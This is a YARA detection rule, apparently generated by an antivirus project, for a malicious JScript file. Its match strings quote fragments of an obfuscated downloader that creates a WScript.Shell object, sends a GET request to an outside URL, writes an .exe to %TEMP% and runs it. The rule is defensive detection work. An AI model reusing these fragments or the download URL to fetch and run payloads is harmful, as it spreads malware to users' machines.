rule sig_20160329_0c5ee95bce5a96bbc91389613a934011 {
  meta:
    description = "datamaliciousorder - file 20160329_0c5ee95bce5a96bbc91389613a934011.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "817a75a1be84cc2f1d5c636f7f8f66c6d4834df9bd5e051f5cc4016ee3791a39"

  strings:
    $s1  = "function Yhcoae() {return Phccyknt[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"xeh4zBaLQ2WDA.exe\";};" fullword ascii
    $s2  = "do {WScript[Hhdhvetom](Ifdynd() * 11)} while (Mkhhawxgur[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Mkhhawxgur[Agtrxl](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s4  = "function Dfvfvb(Qvqxldxyl, Fotmtkwlb){return Qvqxldxyl - Fotmtkwlb;};" fullword ascii
    $s5  = "var Phccyknt = function Yjrrqe() {return WScript[Yxdwuqkboc](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Kwztqdvcx(Nxgkvt){Phccyknt[\"Run\"](Nxgkvt, Jiqggpeoh, Jiqggpeoh);};" fullword ascii
    $s7  = "function Tygcfi() {return ((Ipwuzy == true) && (Ipwuzy == Tfunbirwh)) ? 1 : Jiqggpeoh;};" fullword ascii
    $s8  = "Ipwuzy = true; " fullword ascii
    $s9  = "var Ipwuzy = false;" fullword ascii
    $s10 = "function Yzowlo(Bpddop) {var Xhzcem = (1, 2, 3, 4, 5, Bpddop); return Xhzcem;};" fullword ascii
    $s11 = "var Eienw = new this[\"Date\"]();" fullword ascii
    $s12 = "var Tfunbirwh = false;" fullword ascii
    $s13 = "Tfunbirwh = true; " fullword ascii
    $s14 = "function Jrpexboyld()" fullword ascii
    $s15 = "function Hkcccsd(){return Wojxetc;};" fullword ascii
    $s16 = "function Ppnhvhsobj(){return Yxdwuqkboc;};" fullword ascii
    $s17 = " while (Phyyzqno){" fullword ascii
    $s18 = "var Hwfajkvec = false;" fullword ascii
    $s19 = "return Dfvfvb(Rvudzv, Ncnbtttwfv);" fullword ascii
    $s20 = "function Ifdynd(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}